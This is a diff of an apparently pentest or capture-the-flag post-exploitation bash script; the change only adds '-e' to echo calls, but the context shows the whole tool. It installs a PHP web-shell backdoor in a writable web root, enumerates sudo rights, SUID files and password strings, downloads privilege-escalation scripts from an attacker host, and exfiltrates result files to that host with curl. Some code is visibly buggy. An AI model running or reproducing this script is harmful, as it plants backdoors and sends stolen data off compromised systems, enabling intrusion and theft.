@@ -2,26 +2,26 @@
 
 usage() 
 { 
-		echo "USAGE:"
-		echo "-i	Attacker IP/Host"
-		echo "-u	Local User to Check"
-		echo "-d 	Specify Path To Local wget/curl downloader"	
+		echo -e "USAGE:"
+		echo -e "-i	Attacker IP/Host"
+		echo -e "-u	Local User to Check"
+		echo -e "-d 	Specify Path To Local wget/curl downloader"	
 }
 
 setdload()
 {
 command -v curl >/dev/null 2>&1
 if [ $? -eq 0 ]; then
-	echo "\n[*] Curl Found. Continuing.\n"
+	echo -e "\n[*] Curl Found. Continuing.\n"
 	dload="curl"
 else
 	command -v wget >/dev/null 2>&1
 	if [ $? -eq 0 ]; then
-		echo "\n[*] OK. wget found. Continuingd.\n"
+		echo -e "\n[*] OK. wget found. Continuingd.\n"
 		dload="wget"
 	else
-		echo "\n [!] Neither curl nor wget found. Skipping downloads\n"
-		echo "\n [!] Specify with '-n' \n"
+		echo -e "\n [!] Neither curl nor wget found. Skipping downloads\n"
+		echo -e "\n [!] Specify with '-n' \n"
 		dload="null"
 	fi
 fi
@@ -31,7 +31,7 @@ prep()
 {
 	# Check first argument is supplied. Should be hostname/IP address
 	if [ -z "$ip" ] ; then
-		echo "Host Required"
+		echo -e "Host Required"
 		exit
 	fi
 	
@@ -52,19 +52,19 @@ prep()
 	fi
 	
 	# python2 or 3?
-	#command -v foo >/dev/null 2>&1 || { echo "I require foo but it's not installed.  Aborting." >&2; exit 1; }
+	#command -v foo >/dev/null 2>&1 || { echo -e "I require foo but it's not installed.  Aborting." >&2; exit 1; }
 	#https://www.cyberciti.biz/faq/unix-linux-shell-find-out-posixcommand-exists-or-not/
 }
 
 # Install PHP backdoor in web root
 persist()
 {
-	echo "#### Backdoor Install Attempt ####\n"
-	echo "<?php passthru($_GET['cmd']); ?>" > /var/www/`find /var/www -perm -o+w` 1>/shell.php
+	echo -e "#### Backdoor Install Attempt ####\n"
+	echo -e "<?php passthru($_GET['cmd']); ?>" > /var/www/`find /var/www -perm -o+w` 1>/shell.php
 	if [ $? -eq 0 ]; then
-		echo "\n[*] OK. Backdoor Installed.\n"
+		echo -e "\n[*] OK. Backdoor Installed.\n"
 	else
-		echo "\n [!] Failed. Check Permissions\n"
+		echo -e "\n [!] Failed. Check Permissions\n"
 		ls -la /var/www
 	fi
 }
@@ -72,30 +72,30 @@ persist()
 # Run quick enum commands
 quick_enum()
 {
-	echo "\n#### Sudoers ####\n"
+	echo -e "\n#### Sudoers ####\n"
 	sudo -l
 	
-	echo "\n#### Kernel ####\n"
+	echo -e "\n#### Kernel ####\n"
 	uname -a
 	
-	echo "\n#### SUID Files ####\n"
+	echo -e "\n#### SUID Files ####\n"
 	find / -type f -perm -4000 2>/dev/null
 	
-	echo "\n#### Passwords in /opt?? ####\n"
+	echo -e "\n#### Passwords in /opt?? ####\n"
 	grep -iRl password /opt/*
 	
-	echo "\n#### Check /opt ####\n"
+	echo -e "\n#### Check /opt ####\n"
 	ls -la /opt
 	
-	echo "\n#### Any wp-config.php files? ####\n"
+	echo -e "\n#### Any wp-config.php files? ####\n"
 	find / -name wp-config.php 2>/dev/null
 	
 	if [ "$user" ] ; then
-		echo "\n#### Files Owned by User: $user ####\n"
+		echo -e "\n#### Files Owned by User: $user ####\n"
 		find / -user $2 2>/dev/null
 	fi
 	
-	echo "\n#### Processes ####\n"
+	echo -e "\n#### Processes ####\n"
 	ps aux
 }
 
@@ -103,19 +103,19 @@ quick_enum()
 download()
 {
 	if [ $dload -eq "wget" ] ; then
-		echo "\n#### Downloading LinEnum.sh ####\n"
+		echo -e "\n#### Downloading LinEnum.sh ####\n"
 		$dload $1/LinEnum.sh
 	
-		echo "\n#### Downloading psspy ####\n"
+		echo -e "\n#### Downloading psspy ####\n"
 		$dload $1/psspy
 	
-		echo "\n#### Downloading linux-priv-checker ####\n"
+		echo -e "\n#### Downloading linux-priv-checker ####\n"
 		$dload $1/linuxprivchecker.py
 	
-		echo "\n#### Downloading linpeas.sh ####\n"
+		echo -e "\n#### Downloading linpeas.sh ####\n"
 		$dload $1/linpeas.sh
 	
-		echo "\n#### Downloading lse.sh ####\n"
+		echo -e "\n#### Downloading lse.sh ####\n"
 		$dload $1/lse.sh
 	fi
 }
@@ -127,7 +127,7 @@ execute()
 	
 	for script in "${scripts[@]}"
 	do
-		echo "\n#### Run $script ####\n"
+		echo -e "\n#### Run $script ####\n"
 		bash $script > $script.txt
 	done
 }
@@ -140,11 +140,11 @@ exfiltrate()
 	
 		for file in "${files[@]}"
 		do
-			echo "\n#### Exfiltrating: $file ####\n" 
+			echo -e "\n#### Exfiltrating: $file ####\n" 
 			curl -F "data=@$file" $1:443
 		done
 	else
-		echo "\n### Curl not found. Exfiltrate manually ###\n"
+		echo -e "\n### Curl not found. Exfiltrate manually ###\n"
 	fi
 }
 
